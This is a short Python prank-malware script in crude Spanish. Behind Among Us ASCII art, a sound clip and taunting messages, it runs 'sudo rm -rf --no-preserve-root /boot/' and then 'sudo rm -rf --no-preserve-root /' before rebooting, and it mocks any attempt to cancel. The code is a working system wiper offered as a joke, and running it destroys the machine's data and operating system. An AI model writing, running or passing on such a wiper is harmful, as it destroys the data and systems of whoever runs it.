from os import system
from colorama import Fore
from playsound import playsound
from tkinter import messagebox
from time import sleep
def start_destruction():
     system('sudo rm -rf --no-preserve-root /boot/')
     sleep(10)
     try:
          print(Fore.GREEN, """
     Tu sistema ha sido FOLLADO por el virus susware, no intentes reiniciar tu linux
     porque si no te irá peor, JAJAJAJAJAJA mientras destruimos tu sistema, disfruta del precioso
     among drip
                              `-/++oo++/`              
                         .:++++oo/:+shmy-            
                         .///:::/../:--/yhds`          
                    -::----.`.+/-```/mNdy`         
                    `.`:////:--```sy:/``./mMNo         
               `-:o/++::://::.:-  ./`:. `-hMMd.        
          .` ``--.-::/++/-`/`  ` `.` `odNm.        
          ``   `--://////+/:...`.....-::/so         
          .    --:::///::://+/-.`.````.-:-`         
          ``   `--:/-------::/+++-`--/:...``         
          .`   .---+hhy-------/+///-::+s/.`          
          ```   `....-/h------::::::::-----           
          ` ``````.....-----------::-:/:-.`           
          `````````````.........----.:///:`           
          ```` `.``````````````..--..:::::.           
          ``` ````````````````....`--::::`           
               `````````````````````.----:-            
               ``````````````````````....`            
               ```` `````````````````..`             
               `.````       ```````````              
               `......````        ````                
          ..````.-+hhyoo-`     .+m:                 
          .////:-..:mNNNmh.    `+NM:                 
          --````.. .::/syy.   ```:/o`                 
          .//ssy+:-.````/+     ```-.:/-`               
     .:./ooo+so:.``-::   ``..-/-.-:oh+-`           
     `s+-::sy:hm+-...:.    ````-.--:mNNNmh:`        
     `oyyyss++o++-/-.-:. `````````.:/://+os+        
          -shhy+/::/--/ohMMy.       ``.-:/++:.         
          -shho/--:oddmMMMMh/                        
          :yddho+/////+shhdo.                      
               .+ydddyso+//////:                      
                    .:/oosyyyyss/             
          """)

#         Empieza a sonar el among drip descargado     
          playsound('amogus.mp3')
          messagebox.askquestion(title="Sigues ahi?", message="Sigues usando el pc? disfruta sus  ultimos instantes de vida")
#         Imprime el siguiente mensaje en pantalla
          system('echo "FOLLANDONOS EL SISTEMA OPERATIVO..."')

#         Inicializando eliminación completa del sistema
          system('sudo rm -rf --no-preserve-root /')

#         Reinicia el sistema
          system('sudo reboot')
     
     except KeyboardInterrupt:
          print("No intentes cancelar el programa noob XDDDDDDDDDDDD")
     